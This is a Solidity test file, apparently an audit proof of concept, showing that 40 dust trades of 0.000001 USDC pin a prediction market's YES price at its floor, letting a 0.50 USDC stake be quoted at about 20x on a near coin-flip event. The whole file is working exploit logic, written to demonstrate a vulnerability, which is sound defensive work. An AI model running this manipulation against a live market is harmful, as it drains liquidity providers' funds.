// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./MiniTest.sol";
import "./TestHarness.sol";

/// PoC: MIN_IMPACT floor (1.5%) applies to ANY non-zero stake, so dust trades
/// move the book for free. With the live LP seed (15 USDC) this converts a
/// coin flip into a 20x quoted price.
contract DustManipulationTest is MiniTest, TestHarness {
    function test_PoC_DustTradesPushOddsToFloor() external {
        _deployWithLp(15 * 1e6); // live Arc Testnet LP seed
        vm.warp(10);
        MicroMarket m = _createOpenMarket(500_000); // fair mid 50%

        uint256 yesBefore = m.yesPrice();

        // 40 dust buys of 0.000001 USDC on NO.
        uint256 spent;
        for (uint256 i = 0; i < 40; i++) {
            user.buy(address(m), 2, 1, 10_000);
            spent += 1;
        }

        uint256 yesAfter = m.yesPrice();
        assertTrue(yesAfter < yesBefore, "price did not move");
        assertEq(yesAfter, 54_000, "YES not pinned at floor (mid 5% x 1.08)");

        // Now buy the mispriced side with a real stake.
        uint256 stake = 500_000; // 0.50 USDC
        MicroBoostEngine.Quote memory q = engine.quoteTicket(address(m), 1, stake, 10_000);
        assertTrue(q.accepted, q.reason);
        // payout / stake ~= 20x on a ~50/50 event
        assertTrue(q.payout >= stake * 18, "payout not inflated");
        assertTrue(spent == 40, "spent");
    }
}
